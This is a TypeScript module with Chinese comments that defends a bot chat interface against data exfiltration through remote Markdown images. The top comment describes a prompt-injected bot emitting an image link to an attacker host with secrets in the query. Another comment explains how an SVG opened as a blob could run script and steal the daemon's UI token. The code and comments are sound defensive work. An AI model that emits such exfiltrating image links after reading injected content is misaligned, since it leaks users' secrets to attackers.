/**
 * 對話 Markdown 裡的遠端圖片（issue #764）。bot 會讀外部內容，被 prompt injection 後輸出 `![](https://攻擊者/c?d=機密)`，
 * 瀏覽器一渲染就替它送出去——所以 http(s) 圖片預設不載入，先畫佔位，使用者點了才抓。
 */

export function isRemoteHttpImage(src: string): boolean {
  return /^https?:/i.test(src.trim())
}

/** 參數長到這個長度就警告：正常的圖片網址很少帶這麼長的 query／fragment，夾資料的才會。 */
const SUSPICIOUS_TAIL = 64

export interface RemoteImageInfo {
  host: string
  /** 網址帶帳密、或 query／fragment 很長——可能夾帶資料。 */
  suspicious: boolean
  /** 本機（localhost、127/8、::1）、內網（10/8、172.16/12、192.168/16、fc00::/7）、link-local（169.254/16、fe80::/10）或 `.local`：點下去是由這台機器對它發請求。 */
  internal: boolean
}

/** `URL.hostname` 給的主機名（IPv6 帶方括號）是不是本機／內網位址。 */
function isInternalHost(hostname: string): boolean {
  const h = hostname.toLowerCase()
  if (h === 'localhost' || h.endsWith('.localhost') || h.endsWith('.local')) return true
  if (h.startsWith('[')) {
    const v6 = h.slice(1, -1)
    return v6 === '::1' || v6 === '::' || /^f[cd][0-9a-f]{2}:/.test(v6) || /^fe[89ab][0-9a-f]:/.test(v6)
  }
  const m = /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})$/.exec(h)
  if (!m) return false
  const [a, b] = [Number(m[1]), Number(m[2])]
  return a === 0 || a === 10 || a === 127 || (a === 169 && b === 254) || (a === 172 && b >= 16 && b <= 31) || (a === 192 && b === 168)
}

export function remoteImageInfo(src: string): RemoteImageInfo | null {
  if (!isRemoteHttpImage(src)) return null
  try {
    const u = new URL(src.trim())
    return {
      host: u.hostname,
      suspicious: u.username !== '' || u.password !== '' || u.search.length + u.hash.length > SUSPICIOUS_TAIL,
      internal: isInternalHost(u.hostname),
    }
  } catch {
    return null
  }
}

/** 載入單張遠端圖片的上限，免得一張惡意大檔吃光記憶體。 */
export const REMOTE_IMAGE_MAX_BYTES = 10 * 1024 * 1024

/**
 * 只收這幾種點陣圖。**不收 SVG**：blob URL 繼承 app 的 origin，使用者點圖（`<a href=blob target=_blank>`）在新分頁開 blob 時，
 * SVG 裡的 `<script>` 就在 app 的 origin 執行，能拿到 daemon 的 UI token 操作所有 bot（#764 審查，真瀏覽器實測）。
 * 回傳白名單裡的標準型別；不在名單內回 null。
 */
const SAFE_IMAGE_TYPES = ['image/png', 'image/jpeg', 'image/gif', 'image/webp', 'image/avif', 'image/bmp']
export function safeImageType(contentType: string): string | null {
  const t = contentType.split(';')[0].trim().toLowerCase()
  return SAFE_IMAGE_TYPES.includes(t) ? t : null
}

/** 邊讀邊數，超過上限就停（不等整個回應進記憶體才檢查大小）。 */
async function readCapped(res: Response, type: string): Promise<Blob> {
  const declared = Number(res.headers.get('content-length'))
  if (Number.isFinite(declared) && declared > REMOTE_IMAGE_MAX_BYTES) throw new Error('圖片太大')
  if (!res.body) {
    const b = await res.blob()
    if (b.size > REMOTE_IMAGE_MAX_BYTES) throw new Error('圖片太大')
    return new Blob([b], { type })
  }
  const reader = res.body.getReader()
  const chunks: Uint8Array[] = []
  let total = 0
  for (;;) {
    const { done, value } = await reader.read()
    if (done) break
    total += value.byteLength
    if (total > REMOTE_IMAGE_MAX_BYTES) {
      await reader.cancel().catch(() => {})
      throw new Error('圖片太大')
    }
    chunks.push(value)
  }
  return new Blob(chunks as BlobPart[], { type })
}

/**
 * 使用者點了「載入圖片」才呼叫。瀏覽器自己 `fetch`→blob：不帶 cookie、不帶 Referer（網址裡可能有 token），
 * 回應要是白名單裡的點陣圖（見 [[safeImageType]]，blob 一律用白名單型別重包）且不超過上限；
 * 對方沒開 CORS 或抓不到就丟錯，由畫面改成「在新分頁開啟」的連結。
 */
export async function fetchRemoteImageBlob(src: string, fetchImpl: typeof fetch = fetch): Promise<Blob> {
  const res = await fetchImpl(src, { mode: 'cors', credentials: 'omit', referrerPolicy: 'no-referrer', redirect: 'follow' })
  if (!res.ok) throw new Error(`HTTP ${res.status}`)
  const raw = res.headers.get('content-type') ?? ''
  const type = safeImageType(raw)
  if (!type) throw new Error(/^image\//i.test(raw) ? '不支援的圖片格式（SVG 等可以帶腳本的不收）' : '不是圖片')
  return readCapped(res, type)
}
